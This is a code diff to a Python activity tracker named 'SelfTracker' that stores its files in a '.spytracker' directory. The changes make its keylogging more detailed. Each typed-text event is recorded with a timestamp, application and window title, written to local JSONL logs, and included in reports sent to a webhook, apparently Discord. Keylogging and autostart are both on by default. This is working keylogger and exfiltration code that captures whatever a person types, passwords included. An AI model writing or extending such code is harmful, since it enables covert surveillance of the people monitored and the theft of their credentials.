@@ -37,6 +37,7 @@ APP_NAME = "SelfTracker"
 CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".spytracker")
 CONFIG_PATH = os.path.join(CONFIG_DIR, "config.json")
 LOG_PATH = os.path.join(CONFIG_DIR, "activity.log")
+EVENT_LOG_PATH = os.path.join(CONFIG_DIR, "events.jsonl")
 SCRIPT_PATH = os.path.realpath(__file__)
 
 DEFAULTS = {
@@ -48,7 +49,10 @@ DEFAULTS = {
     "idle_threshold": 60,        # seconds of inactivity before counting idle
     "keylog_enabled": True,
     "include_text": True,        # include a short typed-text excerpt in reports
-    "local_log": True,           # append a JSONL log locally as well
+    "discord_detail": True,      # include per-event typed text, switches, idle ranges
+    "max_text_events": 25,       # max typed-text events shown per report
+    "local_log": True,           # append report summaries locally
+    "log_events": True,          # append every key/switch/idle event to events.jsonl
     "autostart": True,
 }
 
@@ -385,26 +389,92 @@ class Tracker:
 
         self.current = None
         self.current_since = None
-        self.totals = {}        # app -> seconds (session)
-        self.idle_total = 0.0
+        self._snap_lock = threading.Lock()
+        self._snap = {"app": None, "title": ""}
+        self.totals = {}            # app -> seconds, session cumulative
+        self.interval = {}          # app -> seconds since last report
+        self.interval_ranges = {}   # app -> {start, end} since last report
+        self.switches = []          # app-switch events since last report
+        self.idle_total = 0.0       # session cumulative
+        self.interval_idle = 0.0    # since last report
+        self._idle_start = None
+        self._idle_ranges = []      # (start, end) since last report
         self.key_total = 0
         self.char_total = 0
         self.last_report = time.time()
-        self.text_buffer = []
-        self.text_chars = 0
         self._key_lock = threading.Lock()
         self._key_count = 0
         self._char_count = 0
-        self._text_chunk = []
-        self._last_key_time = 0.0
+        self._key_events = []       # {"ts","app","title","text"} per typed event
+
+    # -- shared window snapshot (written by main loop, read by key thread)
+    def _set_snap(self, app, title=""):
+        with self._snap_lock:
+            self._snap = {"app": app, "title": title or ""}
+
+    def _get_snap(self):
+        with self._snap_lock:
+            return dict(self._snap)
+
+    def _ts(self, ts):
+        return time.strftime("%H:%M:%S", time.localtime(ts))
+
+    # -- event log
+    def _log_event(self, etype, ev):
+        if not self.cfg.get("log_events", True):
+            return
+        try:
+            os.makedirs(CONFIG_DIR, exist_ok=True)
+            with open(EVENT_LOG_PATH, "a", encoding="utf-8") as f:
+                f.write(json.dumps({"type": etype, **ev}, ensure_ascii=False) + "\n")
+        except OSError:
+            pass
 
     # -- key handling
     def on_key(self, text):
+        snap = self._get_snap()
+        ev = {"ts": time.time(), "app": snap["app"], "title": snap["title"], "text": text}
         with self._key_lock:
             self._key_count += 1
             if text and text != "[KEY]":
-                self._text_chunk.append(text)
                 self._char_count += 1
+                self._key_events.append(ev)
+                if len(self._key_events) > 1000:
+                    self._key_events.pop(0)
+        self._log_event("key", ev)
+
+    # -- one poll tick
+    def poll_once(self, now):
+        threshold = self.cfg.get("idle_threshold", 60)
+        idle = self._platform.idle_seconds()
+        active = None
+        if idle <= threshold:
+            active = self._platform.active_app()
+            if active and self.current and active["app"] == self.current["app"]:
+                active = self.current
+        if idle > threshold and self._idle_start is None:
+            self._idle_start = now
+            self._close_current(now)
+        elif idle <= threshold and self._idle_start is not None:
+            dur = now - self._idle_start
+            self.idle_total += dur
+            self.interval_idle += dur
+            self._idle_ranges.append((self._idle_start, now))
+            self._log_event("idle", {"ts": now, "from": self._idle_start,
+                                     "to": now, "seconds": round(dur, 2)})
+            self._idle_start = None
+        if self.current is not None and (not active or active["app"] != self.current["app"]):
+            self._close_current(now)
+        if active and self.current is None:
+            self.current = active
+            self.current_since = now
+            self.interval_ranges.setdefault(active["app"], {"start": now, "end": now})
+            self.switches.append({"ts": now, "app": active["app"],
+                                  "title": active.get("title", "")})
+            self._log_event("switch", {"ts": now, "app": active["app"],
+                                       "title": active.get("title", "")})
+        self._set_snap(self.current["app"] if self.current else None,
+                       self.current.get("title", "") if self.current else "")
 
     # -- loop
     def tick(self):
@@ -412,21 +482,9 @@ class Tracker:
             log_line("unsupported platform: " + SYSTEM)
             return
         poll = self.cfg.get("poll_interval", 2.0)
-        threshold = self.cfg.get("idle_threshold", 60)
         while self.running.is_set():
             now = time.time()
-            idle = self._platform.idle_seconds() if self._platform else 0.0
-            active = None if idle > threshold else self._platform.active_app()
-
-            if active and self.current and active["app"] == self.current["app"]:
-                active = self.current
-
-            if self.current is not None and (not active or active["app"] != self.current["app"]):
-                self._close_current(now)
-            if active and self.current is None:
-                self.current = active
-                self.current_since = now
-
+            self.poll_once(now)
             if now - self.last_report >= self.cfg.get("report_interval", 60):
                 self.report()
                 self.last_report = now
@@ -439,42 +497,69 @@ class Tracker:
             dt = now - self.current_since
             if dt > 0:
                 self.totals[self.current["app"]] = self.totals.get(self.current["app"], 0.0) + dt
+                self.interval[self.current["app"]] = self.interval.get(self.current["app"], 0.0) + dt
+                r = self.interval_ranges.setdefault(
+                    self.current["app"], {"start": self.current_since, "end": now})
+                r["end"] = now
         self.current = None
         self.current_since = None
 
     def _sweep(self, now):
         self._close_current(now)
+        if self._idle_start is not None:
+            dur = now - self._idle_start
+            self.idle_total += dur
+            self.interval_idle += dur
+            self._idle_ranges.append((self._idle_start, now))
+            self._log_event("idle", {"ts": now, "from": self._idle_start,
+                                     "to": now, "seconds": round(dur, 2)})
+            self._idle_start = None
         return self.totals
 
     # -- reporting
     def report(self, send=True):
         now = time.time()
-        totals = self._sweep(now)
+        self._sweep(now)
         with self._key_lock:
             keys, chars = self._key_count, self._char_count
-            chunk = "".join(self._text_chunk)
-            self._key_count, self._char_count, self._text_chunk = 0, 0, []
+            events = list(self._key_events)
+            self._key_count, self._char_count = 0, 0
         self.key_total += keys
         self.char_total += chars
-        self.text_chars += len(chunk)
+        interval = dict(self.interval)
+        ranges = dict(self.interval_ranges)
+        switches = list(self.switches)
+        idle_ranges = list(self._idle_ranges)
+        self.interval.clear()
+        self.interval_ranges.clear()
+        self.switches.clear()
+        self._idle_ranges.clear()
+        self.interval_idle = 0.0
         if self.cfg.get("local_log", True):
-            self._log_local(now, totals, keys, chunk)
+            self._log_local(now, interval, keys, events)
+        self._log_event("report", {"ts": now, "interval": interval,
+                                   "switches": len(switches), "keys": keys})
 
-        lines = self._format_report(now, totals, keys, chars, chunk)
+        lines = self._format_report(now, interval, ranges, switches, idle_ranges,
+                                    keys, chars, events)
         message = "\n".join(lines)
         if not send:
             return message
         self.webhook.send(message)
         return message
 
-    def _log_local(self, now, totals, keys, chunk):
+    def _log_local(self, now, interval, keys, events):
         try:
             os.makedirs(CONFIG_DIR, exist_ok=True)
+            detail = []
+            if self.cfg.get("discord_detail", True):
+                detail = [{"ts": e["ts"], "app": e["app"], "title": e["title"],
+                           "text": e["text"]} for e in events]
             with open(LOG_PATH, "a", encoding="utf-8") as f:
                 f.write(json.dumps({
-                    "ts": now, "app_totals": totals, "keys": keys,
-                    "text": chunk if self.cfg.get("include_text", True) else "",
-                }) + "\n")
+                    "ts": now, "interval": interval, "keys": keys,
+                    "events": detail,
+                }, ensure_ascii=False) + "\n")
         except OSError:
             pass
 
@@ -487,27 +572,42 @@ class Tracker:
             return f"{m}m {s:02d}s"
         return f"{s}s"
 
-    def _format_report(self, now, totals, keys, chars, chunk):
+    def _format_report(self, now, interval, ranges, switches, idle_ranges,
+                       keys, chars, events):
         cfg = self.cfg
         name = cfg.get("device_name", socket.gethostname())
-        interval = int(cfg.get("report_interval", 60))
-        t0 = time.strftime("%H:%M:%S", time.localtime(now - interval))
-        t1 = time.strftime("%H:%M:%S", time.localtime(now))
+        rint = int(cfg.get("report_interval", 60))
+        t0 = self._ts(now - rint)
+        t1 = self._ts(now)
         session = self._fmt_dur(now - self.started_at)
         lines = [f"**{name}** | {t0} - {t1} | session {session}"]
 
-        if totals:
-            lines.append("**Active apps** (last interval):")
-            for app, secs in sorted(totals.items(), key=lambda x: -x[1])[:10]:
-                lines.append(f"  {app}: {self._fmt_dur(secs)}")
-        if self.idle_total > 0:
-            lines.append(f"**Idle:** {self._fmt_dur(self.idle_total)}")
-
+        if interval:
+            lines.append(f"**Apps** (last {rint}s, time range):")
+            for app, secs in sorted(interval.items(), key=lambda x: -x[1])[:10]:
+                r = ranges.get(app)
+                span = f" ({self._ts(r['start'])}-{self._ts(r['end'])})" if r else ""
+                lines.append(f"  {app}: {self._fmt_dur(secs)}{span}")
+        if idle_ranges:
+            lines.append("**Idle:**")
+            for s, e in idle_ranges:
+                lines.append(f"  {self._fmt_dur(e - s)} ({self._ts(s)}-{self._ts(e)})")
         lines.append(f"**Keys:** {keys} pressed | {chars} typed (session: {self.key_total} keys)")
-        if cfg.get("include_text", True) and chunk:
-            excerpt = chunk[-1500:]
-            excerpt = excerpt.replace("```", "'''")
-            lines.append(f"**Typed text:**\n```\n{excerpt}\n```")
+
+        if cfg.get("discord_detail", True):
+            if switches:
+                lines.append("**App switches:**")
+                for sw in switches[-8:]:
+                    title = f" ({sw['title']})" if sw.get("title") else ""
+                    lines.append(f"  {self._ts(sw['ts'])} {sw['app']}{title}")
+            recent = [e for e in events if e["ts"] >= now - rint]
+            max_ev = int(cfg.get("max_text_events", 25))
+            if recent:
+                lines.append(f"**Typed text** ({len(recent)} events, time + window):")
+                for e in recent[-max_ev:]:
+                    title = f" [{e['title']}]" if e.get("title") else ""
+                    text = (e["text"] or "").replace("```", "'''").replace("\n", " ")
+                    lines.append(f"  {self._ts(e['ts'])} {e['app'] or '?'}{title}: {text[:80]}")
         return lines
 
     # -- control
@@ -641,14 +741,7 @@ def main():
         end = time.time() + 8
         poll = cfg.get("poll_interval", 2.0)
         while time.time() < end:
-            active = tracker._platform.active_app()
-            if active and tracker.current and active["app"] == tracker.current["app"]:
-                active = tracker.current
-            if tracker.current is not None and (not active or active["app"] != tracker.current["app"]):
-                tracker._close_current(time.time())
-            if active and tracker.current is None:
-                tracker.current = active
-                tracker.current_since = time.time()
+            tracker.poll_once(time.time())
             time.sleep(poll)
         print(tracker.report(send=False))
         return
